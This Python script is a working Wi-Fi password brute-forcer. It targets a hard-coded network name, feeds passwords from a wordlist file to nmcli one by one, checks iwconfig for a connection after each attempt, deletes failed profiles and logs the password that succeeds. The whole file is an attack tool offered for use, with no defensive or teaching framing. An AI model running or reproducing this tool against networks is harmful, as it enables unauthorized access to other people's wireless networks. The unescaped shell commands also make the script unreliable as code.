import time
import os
import sys
import threading
from functools import reduce
from logger import logger


WIFI_NAME = 'RT-WiFi-CE1E'  # Name of the Wi-Fi point to attack
CHECK_CONNECTION_PAUSE = 7  # Pause before connection
                            # check (in secs).
ATTEMPT_NO = -1
FILE_WITH_PASSWORDS = 'brute_passwords1.txt'


def check_connection() -> bool:
    """Сhecks if there is wi-fi connection or not.

    Returns True if it is, False - if it's not.

    """

    time.sleep(CHECK_CONNECTION_PAUSE)
    connection = os.popen('iwconfig', 'r')
    text = reduce((lambda x, y: str(x)+str(y)), connection.readlines())
    logger.info(f'Connection text is:\n{text}')
    ESSID = text.find('ESSID:')
    connected = (text[ESSID+6:ESSID+9])
    logger.info(f'Connected data:\n{connected}')
    connection.close()

    if str(connected) != 'off':
        return True
    if str(connected) == 'off':
        return False


def remove_connection():
    """Removes existing wi-fi connection."""
    try:
        command = f"nmcli connection delete '{WIFI_NAME} {ATTEMPT_NO}'"
        os.popen(command)
        logger.info(f'Remove connection command is {command}')
    except Exception:
        pass
    time.sleep(1)


def password_generator(filename: str) -> str:
    """This function returns passwords from file, one by one."""
    file = open(filename, 'r')
    for line in file:
        yield line


def connect_to_wifi(wifiname: str, password: str, lock):
    """This function tries to connect to the designated wifi."""
    command = f'nmcli dev wifi connect {wifiname} password {password}'
    logger.info('Command is:\n'+command)
    with lock:
        os.popen(command)
    sys.exit()


def brute(wifiname: str, password_generator):

    done = False
    lock = threading.Lock()

    while True:
        try:
            if password:= next(password_generator):
                t = threading.Thread(
                    target = connect_to_wifi,
                    args = (wifiname, password, lock,))
                t.start()
                t.join()
                global ATTEMPT_NO
                ATTEMPT_NO+=1
                done = check_connection()
                if not done:
                    logger.info(f'Attempt no.{ATTEMPT_NO} with password {password}No result.')
                    remove_connection()
                    continue
                else:
                    break

        except StopIteration:
            logger.info(f'Total attempts: {ATTEMPT_NO}.\n No success. Aborting process.')
            sys.exit()

    logger.info(f'Done! Attempt no.{ATTEMPT_NO}:\nThe password is {password}')


if __name__ == '__main__':
    pg = password_generator(FILE_WITH_PASSWORDS)
    brute(WIFI_NAME, pg)